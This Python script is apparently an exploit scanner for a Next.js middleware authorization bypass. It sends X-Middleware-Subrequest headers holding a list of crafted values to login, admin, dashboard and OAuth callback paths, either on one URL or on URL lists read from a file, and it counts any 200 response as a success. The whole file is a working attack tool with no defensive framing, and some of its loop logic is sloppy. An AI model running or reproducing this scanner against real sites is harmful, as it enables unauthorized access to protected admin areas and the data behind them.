#!/usr/bin/python3

import requests
import argparse
from urllib.parse import urlparse

RED = "\033[1;31m"
GREEN = "\033[1;32m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

auto_url = []
payload = ['middleware', 'pages/_middleware', 'middleware:middleware:middleware:middleware:middleware', 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware']

auth_paths = [
    '/',
    '/login',
    '/auth/login',
    '/auth/signin',
    '/signin',
    '/auth/register',
    '/register',
    '/auth/verify',
    '/verify',
    '/admin',
    '/admin/dashboard',
    '/dashboard',
    '/app_admin',
    '/app_admin/dashboard',
    '/dashboard/analytics',
    '/dashboard/crm',
    '/dashboard/ecommerce',
    '/dashboard/marketing',
    '/dashboard/stocks',
    '/users',
    '/users/profile',
    '/users/settings',
    '/settings',
    '/profile',
    '/account',
    '/account/settings',
    '/auth/callback/google',
    '/auth/callback/github',
    '/auth/callback/facebook',
    '/api/auth/callback/google',
    '/api/auth/callback/github',
    '/api/auth/callback/facebook',
    '/logout',
    '/api/auth/signin',
]

# get arguments
parser = argparse.ArgumentParser()
mode = parser.add_mutually_exclusive_group(required=True)
mode.add_argument('--auto', action='store_true', help='Test using common endpoints')
mode.add_argument('--manual', action='store_true', help='Use manually specified endpoint to test')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-u', '--url', help='Single URL to test')
group.add_argument('-f', '--file', help='List of URLs to test from a file')
parser.add_argument('-e', '--endpoint', help='Specify specific endpoints to test against (used on all targets)')

args = parser.parse_args()

def url_test(url):
    parsed = urlparse(url)
    host = parsed.netloc        
    for p in payload: 
        headers = {
            'Host': host,
            'User-Agent': 'curl/8.12.1',
            'X-Middleware-Subrequest': p
        }

        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            print(GREEN + 'SUCCESS! --->', response.status_code, RESET)
            print(CYAN + '   Target:' + RESET, GREEN + url + RESET)
            print('   X-Middleware-Subrequest:', p)
            return True
        
    else:
        print(RED + 'FAILED! --->', response.status_code, RESET)
        print(RED + '   '+ url + RESET)
        return False

def file_test(file):
    with open(file, "r") as f:
        urls = [line.rstrip('\n') for line in f]
        if args.endpoint:
            for url in urls:
                custom_endpoint(args.endpoint, url)
        elif args.auto:
            for url in urls:
                auto(url)
        else:
            for url in urls:
                url_test(url.strip())

def custom_endpoint(endpoint, url):
    with open(endpoint, "r") as end:
        for e in end:
            tmp = url + e
            url_test(tmp.strip())

def auto(url):
    for a in auth_paths:
        auto_url.append(url + a)
    for u in auto_url:
        if url_test(u.strip()):
            break

# debug thing idk

if args.url and args.endpoint:
    custom_endpoint(args.endpoint, args.url)
elif args.url and args.auto:
    auto(args.url)
elif args.url:
    url_test(args.url)
elif args.file:
    file_test(args.file)
